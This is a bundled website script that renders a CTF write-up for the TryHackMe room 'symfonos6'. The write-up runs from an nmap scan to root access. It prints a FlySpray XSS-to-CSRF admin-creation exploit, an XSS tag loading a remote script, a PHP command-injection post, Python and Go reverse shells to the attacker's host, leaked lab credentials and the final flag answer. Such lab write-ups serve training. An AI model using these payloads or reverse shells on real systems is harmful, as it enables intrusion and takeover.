"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[6632],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>m});var r=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var c=r.createContext({}),l=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},p=function(e){var n=l(e.components);return r.createElement(c.Provider,{value:n},e.children)},u="mdxType",x={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},d=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,c=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),u=l(t),d=o,m=u["".concat(c,".").concat(d)]||u[d]||x[d]||a;return t?r.createElement(m,i(i({ref:n},p),{},{components:t})):r.createElement(m,i({ref:n},p))}));function m(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,i=new Array(a);i[0]=d;var s={};for(var c in n)hasOwnProperty.call(n,c)&&(s[c]=n[c]);s.originalType=e,s[u]="string"==typeof e?e:o,i[1]=s;for(var l=2;l<a;l++)i[l]=t[l];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},44201:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>x,frontMatter:()=>a,metadata:()=>s,toc:()=>l});var r=t(87462),o=(t(67294),t(3905));const a={},i="symfonos6",s={unversionedId:"Tryhackme/Symfonos6/Symfonos6",id:"Tryhackme/Symfonos6/Symfonos6",title:"symfonos6",description:'This VM was designed to search for the attackers "Achilles\' heel"',source:"@site/writeups/Tryhackme/Symfonos6/Symfonos6.md",sourceDirName:"Tryhackme/Symfonos6",slug:"/Tryhackme/Symfonos6/",permalink:"/writeups/Tryhackme/Symfonos6/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Sudo Security Bypass",permalink:"/writeups/Tryhackme/Sudo Security Bypass/"},next:{title:"Tartarus",permalink:"/writeups/Tryhackme/Tartarus/"}},c={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Symfonos6",id:"task-1-symfonos6",level:2}],p={toc:l},u="wrapper";function x(e){let{components:n,...a}=e;return(0,o.kt)(u,(0,r.Z)({},p,a,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"symfonos6"},"symfonos6"),(0,o.kt)("p",null,'This VM was designed to search for the attackers "Achilles\' heel"'),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/symfonos6"},"symfonos6")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Cross-site Scripting"),(0,o.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,o.kt)("li",{parentName:"ul"},"Code Injection"),(0,o.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-symfonos6"},"Task 1 Symfonos6"),(0,o.kt)("p",null,"Hack into symfonos6"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/symfonos6$ sudo nmap -A -sS -sC -sV -O 10.10.207.173\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-20 18:53 CEST\nNmap scan report for 10.10.207.173\nHost is up (0.035s latency).\nNot shown: 995 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey:\n|   2048 0e:ad:33:fc:1a:1e:85:54:64:13:39:14:68:09:c1:70 (RSA)\n|   256 54:03:9b:48:55:de:b3:2b:0a:78:90:4a:b3:1f:fa:cd (ECDSA)\n|_  256 4e:0c:e6:3d:5c:08:09:f4:11:48:85:a2:e7:fb:8f:b7 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40\n|_http-title: Site doesn\'t have a title (text/html; charset=UTF-8).\n3000/tcp open  ppp?\n| fingerprint-strings:\n|   GenericLines, Help:\n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest:\n|     HTTP/1.0 200 OK\n|     Content-Type: text/html; charset=UTF-8\n|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647\n|     Set-Cookie: i_like_gitea=2fb5e7b797734900; Path=/; HttpOnly\n|     Set-Cookie: _csrf=OAetB18nAeyWgbp8oaMPVmD3e706MTYwMzIxMjgwMDA1MjgwMjk1OA; Path=/; Expires=Wed, 21 Oct 2020 16:53:20 GMT; HttpOnly\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Tue, 20 Oct 2020 16:53:20 GMT\n|     <!DOCTYPE html>\n|     <html lang="en-US">\n|     <head data-suburl="">\n|     <meta charset="utf-8">\n|     <meta name="viewport" content="width=device-width, initial-scale=1">\n|     <meta http-equiv="x-ua-compatible" content="ie=edge">\n|     <title> Symfonos6</title>\n|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">\n|     <script>\n|     (\'serviceWorker\' in navigator) {\n|     navigator.serviceWorker.register(\'/serviceworker.js\').then(function(registration) {\n|     console.info(\'ServiceWorker registration successful with scope: \', registrat\n|   HTTPOptions:\n|     HTTP/1.0 404 Not Found\n|     Content-Type: text/html; charset=UTF-8\n|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647\n|     Set-Cookie: i_like_gitea=dc2ec37d2b689788; Path=/; HttpOnly\n|     Set-Cookie: _csrf=pKa9MbFDQGIN_2kjvtQM7zXJ-006MTYwMzIxMjgwNTM0OTAzMTYzOA; Path=/; Expires=Wed, 21 Oct 2020 16:53:25 GMT; HttpOnly\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Tue, 20 Oct 2020 16:53:25 GMT\n|     <!DOCTYPE html>\n|     <html lang="en-US">\n|     <head data-suburl="">\n|     <meta charset="utf-8">\n|     <meta name="viewport" content="width=device-width, initial-scale=1">\n|     <meta http-equiv="x-ua-compatible" content="ie=edge">\n|     <title>Page Not Found - Symfonos6</title>\n|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">\n|     <script>\n|     (\'serviceWorker\' in navigator) {\n|     navigator.serviceWorker.register(\'/serviceworker.js\').then(function(registration) {\n|_    console.info(\'ServiceWorker registration successful\n3306/tcp open  mysql   MariaDB (unauthorized)\n5000/tcp open  upnp?\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.0 404 Not Found\n|     Content-Type: text/plain\n|     Date: Tue, 20 Oct 2020 16:53:51 GMT\n|     Content-Length: 18\n|     page not found\n|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:\n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest:\n|     HTTP/1.0 404 Not Found\n|     Content-Type: text/plain\n|     Date: Tue, 20 Oct 2020 16:53:20 GMT\n|     Content-Length: 18\n|     page not found\n|   HTTPOptions:\n|     HTTP/1.0 404 Not Found\n|     Content-Type: text/plain\n|     Date: Tue, 20 Oct 2020 16:53:35 GMT\n|     Content-Length: 18\n|_    page not found\n2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port3000-TCP:V=7.80%I=7%D=10/20%Time=5F8F15FE%P=x86_64-pc-linux-gnu%r(G\nSF:enericLines,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20\nSF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\\nSF:x20Request")%r(GetRequest,2924,"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\nSF:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20Path=/\nSF:;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=2fb5e7b797734900\nSF:;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=OAetB18nAeyWgbp8oaMPVm\nSF:D3e706MTYwMzIxMjgwMDA1MjgwMjk1OA;\\x20Path=/;\\x20Expires=Wed,\\x2021\\x20O\nSF:ct\\x202020\\x2016:53:20\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEO\nSF:RIGIN\\r\\nDate:\\x20Tue,\\x2020\\x20Oct\\x202020\\x2016:53:20\\x20GMT\\r\\n\\r\\n<\nSF:!DOCTYPE\\x20html>\\n<html\\x20lang=\\"en-US\\">\\n<head\\x20data-suburl=\\"\\">\nSF:\\n\\t<meta\\x20charset=\\"utf-8\\">\\n\\t<meta\\x20name=\\"viewport\\"\\x20conten\nSF:t=\\"width=device-width,\\x20initial-scale=1\\">\\n\\t<meta\\x20http-equiv=\\"\nSF:x-ua-compatible\\"\\x20content=\\"ie=edge\\">\\n\\t<title>\\x20Symfonos6</titl\nSF:e>\\n\\t<link\\x20rel=\\"manifest\\"\\x20href=\\"/manifest\\.json\\"\\x20crossori\nSF:gin=\\"use-credentials\\">\\n\\t\\n\\t<script>\\n\\t\\tif\\x20\\(\'serviceWorker\'\\x\nSF:20in\\x20navigator\\)\\x20{\\n\\t\\t\\tnavigator\\.serviceWorker\\.register\\(\'/s\nSF:erviceworker\\.js\'\\)\\.then\\(function\\(registration\\)\\x20{\\n\\t\\t\\t\\t\\n\\t\\\nSF:t\\t\\tconsole\\.info\\(\'ServiceWorker\\x20registration\\x20successful\\x20wit\nSF:h\\x20scope:\\x20\',\\x20registrat")%r(Help,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20\nSF:Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\nSF:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(HTTPOptions,216B,"HTTP/1\\.0\\\nSF:x20404\\x20Not\\x20Found\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\\nSF:r\\nSet-Cookie:\\x20lang=en-US;\\x20Path=/;\\x20Max-Age=2147483647\\r\\nSet-C\nSF:ookie:\\x20i_like_gitea=dc2ec37d2b689788;\\x20Path=/;\\x20HttpOnly\\r\\nSet-\nSF:Cookie:\\x20_csrf=pKa9MbFDQGIN_2kjvtQM7zXJ-006MTYwMzIxMjgwNTM0OTAzMTYzOA\nSF:;\\x20Path=/;\\x20Expires=Wed,\\x2021\\x20Oct\\x202020\\x2016:53:25\\x20GMT;\\x\nSF:20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2020\\x20\nSF:Oct\\x202020\\x2016:53:25\\x20GMT\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\\x20lang\nSF:=\\"en-US\\">\\n<head\\x20data-suburl=\\"\\">\\n\\t<meta\\x20charset=\\"utf-8\\">\\\nSF:n\\t<meta\\x20name=\\"viewport\\"\\x20content=\\"width=device-width,\\x20initi\nSF:al-scale=1\\">\\n\\t<meta\\x20http-equiv=\\"x-ua-compatible\\"\\x20content=\\"i\nSF:e=edge\\">\\n\\t<title>Page\\x20Not\\x20Found\\x20-\\x20\\x20Symfonos6</title>\\\nSF:n\\t<link\\x20rel=\\"manifest\\"\\x20href=\\"/manifest\\.json\\"\\x20crossorigin\nSF:=\\"use-credentials\\">\\n\\t\\n\\t<script>\\n\\t\\tif\\x20\\(\'serviceWorker\'\\x20i\nSF:n\\x20navigator\\)\\x20{\\n\\t\\t\\tnavigator\\.serviceWorker\\.register\\(\'/serv\nSF:iceworker\\.js\'\\)\\.then\\(function\\(registration\\)\\x20{\\n\\t\\t\\t\\t\\n\\t\\t\\t\nSF:\\tconsole\\.info\\(\'ServiceWorker\\x20registration\\x20successful\\x20");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port5000-TCP:V=7.80%I=7%D=10/20%Time=5F8F15FF%P=x86_64-pc-linux-gnu%r(G\nSF:enericLines,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20\nSF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\\nSF:x20Request")%r(GetRequest,7F,"HTTP/1\\.0\\x20404\\x20Not\\x20Found\\r\\nConte\nSF:nt-Type:\\x20text/plain\\r\\nDate:\\x20Tue,\\x2020\\x20Oct\\x202020\\x2016:53:2\nSF:0\\x20GMT\\r\\nContent-Length:\\x2018\\r\\n\\r\\n404\\x20page\\x20not\\x20found")%\nSF:r(RTSPRequest,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x\nSF:20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Ba\nSF:d\\x20Request")%r(HTTPOptions,7F,"HTTP/1\\.0\\x20404\\x20Not\\x20Found\\r\\nCo\nSF:ntent-Type:\\x20text/plain\\r\\nDate:\\x20Tue,\\x2020\\x20Oct\\x202020\\x2016:5\nSF:3:35\\x20GMT\\r\\nContent-Length:\\x2018\\r\\n\\r\\n404\\x20page\\x20not\\x20found\nSF:")%r(Help,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te\nSF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2\nSF:0Request")%r(SSLSessionReq,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCo\nSF:ntent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\nSF:\\r\\n400\\x20Bad\\x20Request")%r(TerminalServerCookie,67,"HTTP/1\\.1\\x20400\nSF:\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\nSF:Connection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(TLSSessionReq,67,\nSF:"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20\nSF:charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(\nSF:Kerberos,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20tex\nSF:t/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20\nSF:Request")%r(FourOhFourRequest,7F,"HTTP/1\\.0\\x20404\\x20Not\\x20Found\\r\\nC\nSF:ontent-Type:\\x20text/plain\\r\\nDate:\\x20Tue,\\x2020\\x20Oct\\x202020\\x2016:\nSF:53:51\\x20GMT\\r\\nContent-Length:\\x2018\\r\\n\\r\\n404\\x20page\\x20not\\x20foun\nSF:d")%r(LPDString,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\nSF:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20\nSF:Bad\\x20Request")%r(LDAPSearchReq,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\nSF:\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20clo\nSF:se\\r\\n\\r\\n400\\x20Bad\\x20Request");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=44092%PV=Y%DS=2%DC=T%G=Y%TM=5F8F16\nOS:67%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%II=I%TS=A)SEQ(SP=\nOS:105%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=I\nOS:%TS=A)SEQ(SP=105%GCD=1%ISR=109%TI=Z%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11N\nOS:W7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF\nOS:%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508\nOS:NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R\nOS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=\nOS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=\nOS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID\nOS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT      ADDRESS\n1   34.50 ms 10.8.0.1\n2   34.77 ms 10.10.207.173\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 113.86 seconds\n')),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.207.173/flyspray/index.php?do=details&task_id=1"},"http://10.10.207.173/flyspray/index.php?do=details&task_id=1")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'# Exploit Title: XSRF Stored FlySpray 1.0-rc4 (XSS2CSRF add admin account)\n# Date: 19/04/2017\n# Exploit Author: Cyril Vallicari / HTTPCS / ZIWIT\n: https://www.openoffice.org\n# Version: 1.0-rc4\n# Tested on: Windows 7 x64 SP1 / Kali Linux\n\n\nDescription :\n\nA vulnerability has been discovered in Flyspray , which can be\nexploited by malicious people to conduct cross-site scripting attacks. Input\npassed via the \'real_name\' parameter to \'/index.php?do=myprofile\' is not\nproperly sanitised before being returned to the user. This can be exploited\nto execute arbitrary HTML and script code in a user\'s browser session in\ncontext of an affected site.\n\nThe script is executed on the parameter page AND on any page that allow the\nuser to put a comment.\n\n\nThis XSS vector allow to execute scripts to gather the CSRF token\n\nand submit a form to create a new admin\n\n\nHere\'s the script :\n\nvar tok = document.getElementsByName(\'csrftoken\')[0].value;\n\nvar txt = \'<form method="POST" id="hacked_form"\naction="index.php?do=admin&area=newuser">\'\ntxt += \'<input type="hidden" name="action" value="admin.newuser"/>\'\ntxt += \'<input type="hidden" name="do" value="admin"/>\'\ntxt += \'<input type="hidden" name="area" value="newuser"/>\'\ntxt += \'<input type="hidden" name="user_name" value="hacker"/>\'\ntxt += \'<input type="hidden" name="csrftoken" value="\' + tok + \'"/>\'\ntxt += \'<input type="hidden" name="user_pass" value="12345678"/>\'\ntxt += \'<input type="hidden" name="user_pass2" value="12345678"/>\'\ntxt += \'<input type="hidden" name="real_name" value="root"/>\'\ntxt += \'<input type="hidden" name="email_address" value="root@root.com"/>\'\ntxt += \'<input type="hidden" name="verify_email_address" value="\nroot@root.com"/>\'\ntxt += \'<input type="hidden" name="jabber_id" value=""/>\'\ntxt += \'<input type="hidden" name="notify_type" value="0"/>\'\ntxt += \'<input type="hidden" name="time_zone" value="0"/>\'\ntxt += \'<input type="hidden" name="group_in" value="1"/>\'\ntxt += \'</form>\'\n\nvar d1 = document.getElementById(\'menu\');\nd1.insertAdjacentHTML(\'afterend\', txt);\ndocument.getElementById("hacked_form").submit();\n\nThis will create a new admin account, hacker:12345678\n\nPOC video : *https://www.youtube.com/watch?v=eCf9a0QpnPs\n\nPatch : No patch yet\n')),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(38574).Z,width:"554",height:"225"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},'"><script src="http://10.8.106.222/script.js" />')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"}," FS#2 - self hosted git service\n\nI have configured gitea for our git needs internally!\n\nHere are my creds in case anyone wants to check out our project!\n\nachilles:h2sBr9gryBunKdF9\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/symfonos6$ curl -s -L -X POST "http://10.10.207.173:5000/ls2o4g/v1.0/auth/login" -H \'Content-Type: application/json\' --data-raw \'{"username": "achilles", "password" : "h2sBr9gryBunKdF9" }\'\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDM4MTkzMzAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.V75lZc-v3cPOtVNLTX8eaaFFdG5xHJmC73AEKl25exs",\n  "user": { "display_name": "achilles", "id": 1, "username": "achilles" }\n}\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "exp": 1603819330,\n  "user": {\n    "display_name": "achilles",\n    "id": 1,\n    "username": "achilles"\n  }\n}\n\nexpires in 6 days and 23:58:52\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/symfonos6$ TOKEN=$(curl -s -L -X POST "http://10.10.207.173:5000/ls2o4g/v1.0/auth/login" -H \'Content-Type: application/json\' --data-raw \'{"username": "achilles", "password" : "h2sBr9gryBunKdF9" }\' | jq -r \'.token\')\n\nkali@kali:~/CTFs/tryhackme/symfonos6$ curl -L -X POST "http://10.10.207.173:5000/ls2o4g/v1.0/posts" -H \'Content-Type: application/json\' -H "Authorization: Bearer $TOKEN" --data-raw \'{"text": "system($_GET[\'cmd\']);" }\'\n{"created_at":"2020-10-20T13:25:31.878258913-04:00","id":2,"text":"system($_GET[cmd]);","user":{"display_name":"achilles","id":1,"username":"achilles"}}\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},'/posts/?cmd=python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\'')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/symfonos6$ nc -lvnp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.207.173] 46854\nbash: no job control in this shell\nbash-4.2$ id\nid\nuid=48(apache) gid=48(apache) groups=48(apache)\nbash-4.2$ python -c \'import pty; pty.spawn("/bin/bash")\'\npython -c \'import pty; pty.spawn("/bin/bash")\'\nbash-4.2$ su achilles\nsu achilles\nPassword: h2sBr9gryBunKdF9\n[achilles@symfonos6 posts]$ sudo -l\nsudo -l\nMatching Defaults entries for achilles on symfonos6:\n    !visiblepw, always_set_home, match_group_by_gid, env_reset,\n    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",\n    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",\n    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",\n    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",\n    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",\n    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin\n\nUser achilles may run the following commands on symfonos6:\n    (ALL) NOPASSWD: /usr/local/go/bin/go\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.8.106.222:9002");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > shell.go')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/symfonos6$ nc -lnvp 9002\nlistening on [any] 9002 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.207.173] 43564\nwc -c proof.txt\nwc: proof.txt: No such file or directory\nls\n3d5da415e54c13d53015b93a3412767a\ngo-build001399189\ngo-build820990350\nshell.go\nt.go\nid\nuid=0(root) gid=0(root) groups=0(root)\ncd /root\nls\nproof.txt\nscripts\nwc -c proof.txt\n592 proof.txt\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Initial version")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1.0-rc4")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"wc -c proof.txt?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"592")))}x.isMDXComponent=!0},38574:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/2020-10-20_19-05-08bd502e988e44053e77516fe24f683b.png"}}]);